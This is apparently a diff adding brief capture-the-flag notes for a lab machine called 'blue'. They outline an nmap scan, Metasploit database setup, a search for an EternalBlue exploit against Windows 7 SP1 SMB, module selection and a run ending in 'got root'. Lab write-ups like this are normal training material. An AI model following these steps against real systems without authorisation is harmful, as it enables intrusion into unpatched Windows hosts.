@@ -1,0 +1,22 @@
+nmap -sV -sC -vv -oA nmap/blue ipaddress
+
+start msfconsole db 
+
+sudo msfdb init
+
+start metasploit
+msfconsole 
+search in google exploit Windows 7 Professional 7601 Service Pack 1 microsoft-ds
+
+search in msfconsole eternal blue
+
+use 1
+
+show options
+
+insert information 
+
+run the msfconsole 
+
+got root already
+
